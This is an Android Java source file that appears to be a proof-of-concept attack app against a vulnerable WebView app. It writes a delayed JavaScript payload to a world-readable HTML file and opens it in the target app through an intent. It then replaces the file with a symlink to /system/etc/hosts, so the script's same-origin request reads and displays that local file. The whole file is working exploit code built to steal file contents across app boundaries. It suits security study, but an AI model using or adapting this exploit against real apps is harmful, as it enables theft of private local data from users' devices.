package demo.yang.com.a01_attack_webview_demo;
import android.app.Activity;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;

public class MainActivity extends Activity {
    public final static String HTML =
            "<body>" +
                    "<u>Wait a few seconds.</u>" +
                    "<script>" +
                    "var d = document;"+
                    "function doitjs(){"+
                    "var xhr = new XMLHttpRequest;"+
                    "xhr.onload = function(){"+
                    "var txt = xhr.responseText;"+
                    "d.body.appendChild(d.createTextNode(txt));"+
                    "alert(txt);"+"};"+
                    "xhr.open('GET',d.URL);"+
                    "xhr.send(null);"+
                    "}"+
                    "setTimeout(doitjs,8000);"+
                    "</script>"+
                    "</body>";

    public static String MY_TMP_DIR;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        MY_TMP_DIR = getDir("payload_odex", MODE_PRIVATE).getAbsolutePath();
        doit();
    }

    public void doit() {
        String HTML_PATH = MY_TMP_DIR + "/A0" + ".html";
        try {
            cmdexec("mkdir " + MY_TMP_DIR);
            cmdexec("echo \"" + HTML + "\" > " + HTML_PATH);
            cmdexec("chmod -R 777 " + MY_TMP_DIR);
            Thread.sleep(1000);
            invokeVulnAPP("file://" + HTML_PATH);
            Thread.sleep(6000);
            cmdexec("rm " + HTML_PATH);
            cmdexec("ln -s " + "/system/etc/hosts" + " " + HTML_PATH);
        } catch (Exception e) {
            // TODO: handle exception
        }

    }

    public void invokeVulnAPP(String url) {
        try {
            Intent intent = new Intent(Intent.ACTION_MAIN,Uri.parse(url));
            intent.addCategory(Intent.CATEGORY_LAUNCHER);
            intent.setClassName("com.yang.demo", "com.yang.demo.MainActivity");
            startActivity(intent);
        } catch (Exception e) {
            // TODO: handle exception
        }
    }

    public void cmdexec(String cmd) {
        try {
            String[] tmp = new String[] { "/system/bin/sh", "-c", cmd };
            Runtime.getRuntime().exec(tmp);
        } catch (Exception e) {
            // TODO: handle exception
        }
    }

}
